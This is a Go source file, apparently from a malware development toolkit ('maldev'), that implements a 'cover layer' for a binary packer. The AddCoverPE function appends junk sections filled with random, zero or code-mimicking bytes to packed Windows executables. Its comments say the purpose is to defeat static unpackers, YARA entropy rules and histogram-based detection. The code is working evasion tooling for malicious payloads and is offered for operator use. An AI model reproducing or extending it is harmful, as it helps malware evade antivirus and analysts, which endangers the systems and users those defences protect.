// Package packer — cover layer (P3.1 Phase 3).
//
// AddCoverPE / AddCoverELF append junk sections to a packed binary
// to defeat naive static unpackers that fingerprint a packer by its
// section count + characteristic + entropy profile. The added bytes
// are never executed and never read by the loader; they exist
// purely to inflate the static surface and (optionally) raise the
// average entropy of the file so simple "look for high-entropy
// blobs == encrypted payload" heuristics misfire.
//
// The cover layer is independent of the SGN-encoded .text and the
// transform stub. Operators chain it AFTER PackBinary:
//
//	packed, _, _ := packer.PackBinary(input, opts)
//	covered, _   := packer.AddCoverPE(packed, packer.CoverOptions{
//	        JunkSections: []packer.JunkSection{
//	                {Name: ".rsrc", Size: 0x4000, Fill: packer.JunkFillRandom},
//	                {Name: ".rdata2", Size: 0x2000, Fill: packer.JunkFillPattern},
//	        },
//	})
//
// MITRE: T1027 (Obfuscated Files or Information) / T1027.005
// (Indicator Removal from Tools).

package packer

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"

	"github.com/oioio-space/maldev/pe/packer/transform"
)

// JunkFill chooses how a junk section's body is generated. Each
// strategy aims at a different family of static-analysis heuristic.
type JunkFill uint8

const (
	// JunkFillRandom fills the section with cryptographic-quality
	// random bytes. Maxes out per-byte entropy (~8.0 bits) — good
	// for raising the file's average entropy and for hiding among
	// genuinely-encrypted .text sections of other packers. Bad if
	// the analyst flags "high-entropy non-RX section" as the
	// signal: the section reads RX-clear and shows up immediately.
	JunkFillRandom JunkFill = iota

	// JunkFillZero fills the section with zeros. Lowest-entropy
	// option; useful when stretching SizeOfImage without raising
	// the entropy curve (e.g., to push past a YARA rule that
	// triggers above a percentage threshold).
	JunkFillZero

	// JunkFillPattern fills the section with a repeating
	// frequency-ordered byte pattern that mimics machine code:
	// 0x00 (call/jmp displacement), 0x48 (REX.W), 0xC3 (RET),
	// 0xCC (INT3), 0x90 (NOP), 0xFF (CALL/JMP near opcode),
	// 0xE8 (CALL rel32), 0x55 (PUSH RBP). Result entropy ~3 bits
	// — looks like genuine .text under a casual entropy plot.
	JunkFillPattern
)

// JunkSection describes one cover section to append.
type JunkSection struct {
	// Name is the 8-byte section name (truncated / NUL-padded).
	// Common cover names: `.rsrc`, `.rdata2`, `.pdata`, `.tls`.
	// Empty string defaults to `.rdata`.
	Name string

	// Size is the virtual+raw size of the section in bytes. Will
	// be rounded up to FileAlignment / SectionAlignment by the
	// PE/ELF emitter. Operator chooses based on how much padding
	// they want to add to the file.
	Size uint32

	// Fill picks the byte-pattern strategy. See [JunkFill].
	Fill JunkFill
}

// CoverOptions bundles the cover-layer configuration. Reserved for
// future expansion (fake imports, fake exports, bogus reloc table)
// once Phase 3 grows beyond junk sections.
type CoverOptions struct {
	// JunkSections is the ordered list of sections to append.
	// Each section contributes Size bytes of file growth (rounded
	// to FileAlignment).
	JunkSections []JunkSection
}

// ErrCoverInvalidOptions signals an empty / malformed CoverOptions.
var ErrCoverInvalidOptions = errors.New("packer/cover: invalid options")

// ErrCoverSectionTableFull signals the input PE has no remaining
// space between its phdr table and the first section's file offset
// for additional section headers. Real PEs almost always have
// slack; the error is for defensive synthetic-input rejection.
var ErrCoverSectionTableFull = errors.New("packer/cover: section table full")

// frequencyOrderedPattern mirrors the byte distribution of a real
// .text section. Same shape as [pe/packer/entropy] uses for its
// interleave strategy — sharing the alphabet keeps the cover layer
// indistinguishable from the entropy step's output under a
// histogram analysis.
var frequencyOrderedPattern = [8]byte{0x00, 0x48, 0xC3, 0xCC, 0x90, 0xFF, 0xE8, 0x55}

// AddCoverPE appends junk sections to a packed PE32+ produced by
// [PackBinary]. The input is not modified; a new buffer is
// returned with the sections appended after the existing section
// table and SizeOfImage / NumberOfSections updated.
//
// The added sections carry IMAGE_SCN_MEM_READ only (no W, no X).
// Loader maps them as ordinary read-only data; runtime behaviour
// is unchanged. Operators concerned about static analysis should
// pair JunkFillRandom with a vendor-realistic name (`.rsrc`,
// `.rdata2`); concerned about entropy heuristics should pair
// JunkFillZero with a benign name.
//
// Returns ErrCoverInvalidOptions when JunkSections is empty,
// ErrCoverSectionTableFull when the section table cannot grow.
func AddCoverPE(input []byte, opts CoverOptions) ([]byte, error) {
	if len(opts.JunkSections) == 0 {
		return nil, ErrCoverInvalidOptions
	}
	if !bytesAreLikelyPE(input) {
		return nil, fmt.Errorf("%w: not a PE32+ (no MZ/PE)", ErrCoverInvalidOptions)
	}

	peOff := binary.LittleEndian.Uint32(input[0x3C:0x40])
	coffOff := peOff + 4 // PE\0\0
	numSections := binary.LittleEndian.Uint16(input[coffOff+2 : coffOff+4])
	sizeOfOptHdr := binary.LittleEndian.Uint16(input[coffOff+0x10 : coffOff+0x12])
	optOff := coffOff + 20

	sectionAlign := binary.LittleEndian.Uint32(input[optOff+0x20 : optOff+0x24])
	fileAlign := binary.LittleEndian.Uint32(input[optOff+0x24 : optOff+0x28])
	sizeOfImage := binary.LittleEndian.Uint32(input[optOff+0x38 : optOff+0x3C])

	sectionTableOff := uint32(optOff) + uint32(sizeOfOptHdr)

	// One pass over the section table records the highest existing
	// RVA + raw end (so new sections can sit cleanly after them) and
	// the lowest raw offset (so the section-table-grow check below
	// knows the slack ceiling).
	var maxRVAEnd, maxRawEnd uint32
	firstSecRaw := uint32(0xFFFFFFFF)
	for i := uint16(0); i < numSections; i++ {
		hdr := sectionTableOff + uint32(i)*40
		va := binary.LittleEndian.Uint32(input[hdr+0x0C : hdr+0x10])
		vSize := binary.LittleEndian.Uint32(input[hdr+0x08 : hdr+0x0C])
		raw := binary.LittleEndian.Uint32(input[hdr+0x14 : hdr+0x18])
		rawSize := binary.LittleEndian.Uint32(input[hdr+0x10 : hdr+0x14])
		if e := transform.AlignUpU32(va+vSize, sectionAlign); e > maxRVAEnd {
			maxRVAEnd = e
		}
		if e := raw + rawSize; e > maxRawEnd {
			maxRawEnd = e
		}
		if raw < firstSecRaw {
			firstSecRaw = raw
		}
	}

	// Plan the new sections: each gets aligned RVA + file offset.
	type planned struct {
		name     [8]byte
		rva      uint32
		raw      uint32
		size     uint32
		rawSize  uint32
		fillBody []byte
	}
	plans := make([]planned, len(opts.JunkSections))
	rvaCursor := transform.AlignUpU32(maxRVAEnd, sectionAlign)
	rawCursor := transform.AlignUpU32(maxRawEnd, fileAlign)

	for i, js := range opts.JunkSections {
		name := js.Name
		if name == "" {
			name = ".rdata"
		}
		copy(plans[i].name[:], name)
		plans[i].rva = rvaCursor
		plans[i].raw = rawCursor
		plans[i].size = js.Size
		plans[i].rawSize = transform.AlignUpU32(js.Size, fileAlign)
		body, err := generateJunkBody(js.Size, js.Fill)
		if err != nil {
			return nil, err
		}
		plans[i].fillBody = body
		rvaCursor = transform.AlignUpU32(rvaCursor+js.Size, sectionAlign)
		rawCursor += plans[i].rawSize
	}

	// Reject when the new section headers would overrun into the
	// first section's body bytes (no slack between table and data).
	newTableEnd := sectionTableOff + uint32(numSections+uint16(len(plans)))*40
	if newTableEnd > firstSecRaw {
		return nil, ErrCoverSectionTableFull
	}

	totalSize := rawCursor
	if uint32(len(input)) > totalSize {
		totalSize = uint32(len(input))
	}
	out := make([]byte, totalSize)
	copy(out, input)

	for i, p := range plans {
		hdrOff := sectionTableOff + uint32(numSections+uint16(i))*40
		copy(out[hdrOff:hdrOff+8], p.name[:])
		binary.LittleEndian.PutUint32(out[hdrOff+0x08:hdrOff+0x0C], p.size)    // VirtualSize
		binary.LittleEndian.PutUint32(out[hdrOff+0x0C:hdrOff+0x10], p.rva)     // VirtualAddress
		binary.LittleEndian.PutUint32(out[hdrOff+0x10:hdrOff+0x14], p.rawSize) // SizeOfRawData
		binary.LittleEndian.PutUint32(out[hdrOff+0x14:hdrOff+0x18], p.raw)     // PointerToRawData
		// Characteristics: MEM_READ + CNT_INITIALIZED_DATA. No W, no X.
		binary.LittleEndian.PutUint32(out[hdrOff+0x24:hdrOff+0x28], 0x40000040)
		copy(out[p.raw:p.raw+uint32(len(p.fillBody))], p.fillBody)
	}

	// Bump NumberOfSections.
	binary.LittleEndian.PutUint16(out[coffOff+2:coffOff+4], numSections+uint16(len(plans)))

	// Bump SizeOfImage to cover the new RVAs.
	if rvaCursor > sizeOfImage {
		binary.LittleEndian.PutUint32(out[optOff+0x38:optOff+0x3C], rvaCursor)
	}

	return out, nil
}

// generateJunkBody produces `size` bytes per the chosen JunkFill.
func generateJunkBody(size uint32, fill JunkFill) ([]byte, error) {
	body := make([]byte, size)
	switch fill {
	case JunkFillRandom:
		if _, err := rand.Read(body); err != nil {
			return nil, fmt.Errorf("packer/cover: random fill: %w", err)
		}
	case JunkFillZero:
		// make() already zeroes.
	case JunkFillPattern:
		for i := range body {
			body[i] = frequencyOrderedPattern[i%len(frequencyOrderedPattern)]
		}
	default:
		return nil, fmt.Errorf("%w: unknown JunkFill %d", ErrCoverInvalidOptions, fill)
	}
	return body, nil
}

// bytesAreLikelyPE checks the MZ magic + e_lfanew + PE\0\0 signature
// without doing the full PlanPE walk. Fast pre-flight for cover-layer
// rejection.
func bytesAreLikelyPE(input []byte) bool {
	if len(input) < 0x40 {
		return false
	}
	if input[0] != 'M' || input[1] != 'Z' {
		return false
	}
	peOff := binary.LittleEndian.Uint32(input[0x3C:0x40])
	if int(peOff)+4 > len(input) {
		return false
	}
	return binary.LittleEndian.Uint32(input[peOff:peOff+4]) == 0x00004550
}

